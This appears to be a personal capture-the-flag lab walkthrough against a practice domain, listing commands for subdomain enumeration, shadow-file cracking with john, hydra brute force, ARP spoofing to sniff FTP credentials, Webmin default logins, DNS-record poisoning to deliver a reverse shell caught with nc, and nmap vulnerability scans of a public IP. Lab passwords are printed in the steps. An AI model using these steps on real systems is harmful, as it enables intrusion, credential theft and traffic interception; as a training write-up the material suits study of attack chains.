1. dnsenum yolo.co.il
2. gobuster vhost -w /rockyou.txt -u yolo.co.il  
   ffuf -w  /usr/share/dirb/wordlists/common.txt -u http://admin.yolo.co.il/FUZZ    #(two ways for subdomain enumeration)
3. dirb  http://admin.yolo.co.il/ -w
4. http://admin.yolo.co.il/backup/ (the directory found in privious steps)
5. john shadow --format=crypt (inside backup directory which we download from the url in privious step ther's a shado file, and john crack the password from the hash there)
6. nmap -p- --min-rate 100 -sV 10.1.22.122 (10.1.0.122 is my yolo ip, i check what ports are open and found port 2222)
7. ssh dexter@10.1.22.122 -p 2222
put the password that john found "iloveyou1"

#####       found a flag!!!     #####

8. sudo hydra -l admin -P ./rockyou.txt -f admin.yolo.co.il -s 80 http-post-form "/?:username=^USER^&pswrd=^PASS^:F=<form action="">"    #brute forceing, we got result but it's not working.
9. hydra ssh syntax: hydra -l shlomke -P /usr/share/wordlists/rockyou.txt ssh://10.10.55.37 -V
10. ssh to admin with the found password fails
11. nmap -p0-65535 192.168.2.0/24 (scan dexter's network)
12. telnet 192.168.2.3 10000   #connect to the dns server (not sure what to to with it)
13. sudo dig axfr @192.168.2.3
14. curl http://192.168.2.3:10000
15. wget https://c4705d283d7e:10000 --no-check-certificate
16. wget https://c4705d283d7e//images/favicons/webmin/apple-touch-icon.png:10000 --no-check-certificate  (#download a file, not sure what to do with it.)
17. apt install dsniff  (For sniffing passwords from plaintext protocols like ftp, and for arpspoofing)
18. sudo arpspoof -i eth0 -t 192.168.2.254 192.168.2.8  #arp spoffing to tell the router that i'm the ftp server.
19. sudo tcpdump dst 192.168.2.8  #listen to the traffic to the ftp server. (which the router send to me now because of the spoofing)
20. we found username and password! ftp_yolo  CyberSec@12 
21. ftp ftp.yolo.co.il # and put the details of the user.
22. get flag2.txt   (download the file)

######       found another flag!!!     ######

22. nmap -p0-5000 10.1.22.122
23. scp -P 2222 ftp_server.py dexter@10.1.22.122:/home/dexter    (#ftp server file)
24. scp -P 2222 clock_update.sh dexter@10.1.22.122:/home/dexter  (#the reverse shell file)
### connect to webmin page in order to change the dns record so i can get the request from the client and send him the reverse shell file:
25. ssh -L 8082:192.168.2.3:10000 -p 2222 dexter@10.1.22.122 #create a proxy to connect to the dns server with port 10000
26. in the URL: https://localhost:8082
27. put the default logins to the webmin: user - root, password - password
28. change the record for the ftp server to our address 192.168.2.2
28. check that you made it right: dig ftp.yolo.co.il
29. run ftp_server.py
30. listen with nc: nc -l 32340
31. we got reverse shell on the user. ls - and ther's the 3rd flag.

########################################################################################################################################################################
															more pentest stuff with nmap:
1. git clone https://github.com/vulnersCom/nmap-vulners.git
2. cd /usr/share/nmap/scripts/
3. nmap -sV --script nmap-vulners/ 151.101.131.5 -p 80
4. nmap -sV --script nmap-vulners/ 151.101.131.5

########################################################################################################
															usefull stuff
1. kill a process that use specific port: sudo kill -9 `sudo lsof -t -i:9001`





